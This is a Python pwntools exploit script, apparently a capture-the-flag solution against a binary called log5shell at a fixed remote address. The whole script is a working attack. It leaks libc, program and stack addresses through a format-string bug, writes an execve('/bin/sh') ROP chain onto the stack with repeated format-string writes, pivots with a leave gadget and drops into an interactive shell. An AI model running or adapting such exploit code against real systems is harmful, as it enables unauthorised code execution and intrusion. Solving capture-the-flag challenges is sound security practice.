#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template --host 178.128.96.165 --port 2 ./log5shell
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('./log5shell_patched')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '178.128.96.165'
port = int(args.PORT or 2)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
# b *main+198
b *printf+198
c
c
c
c
c
c
c
c
b *abort+287
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      PIE enabled

io = start()

libc = exe.libc

idx = 27
stk =25
libc_kurang = 9


p = "%23$p-%{}$p-%{}$p".format(idx,stk)
io.sendline(p)
io.recvline()
data = io.recvline()[:-1].split("-")

libc.address = int(data[0],16) - libc.sym['__libc_start_main'] - 234-libc_kurang
exe.address = int(data[1],16) - exe.sym['main']
stack = int(data[2],16) -0xf0
print hex(libc.address)
print hex(exe.address)
print "Stack : ",hex(stack)
system = libc.sym['system']
pop_rdi = exe.address + 0x0000000000001353
bin_sh = libc.search("/bin/sh\x00").next()
pop_rsi = libc.address + 0x0000000000027529
pop_rdx = libc.address + 0x0000000000162866
pop_rax = libc.address + 0x000000000004a550
syscall = libc.address + 0x000000000002584d
print hex(bin_sh)
malloc_hook = libc.sym['__malloc_hook']

og = [0xe6e73,0xe6e76,0xe6e79]

one = libc.address + og[2]

writes = {
    stack : pop_rdi,
}
p = fmtstr_payload(8, writes, write_size='short')
io.sendline(p)

writes = {
    stack+8 : bin_sh,
}
p = fmtstr_payload(8, writes, write_size='short')
io.sendline(p)

writes = {
    stack+16 : pop_rsi,
}
p = fmtstr_payload(8, writes, write_size='short')
io.sendline(p)

writes = {
    stack+24 : 0,
}
p = fmtstr_payload(8, writes, write_size='short')
io.sendline(p)

writes = {
    stack+32 : pop_rax,
}
p = fmtstr_payload(8, writes, write_size='short')
io.sendline(p)

writes = {
    stack+40 : 59,
}
p = fmtstr_payload(8, writes, write_size='short')
io.sendline(p)

writes = {
    stack+48 : syscall,
}
p = fmtstr_payload(8, writes, write_size='short')
io.sendline(p)


leave = libc.address + 0x000000000005aa48
stack = stack-0x90
writes = {
    stack : leave,
}
p = fmtstr_payload(8, writes, write_size='short')
io.sendline(p)

io.interactive()

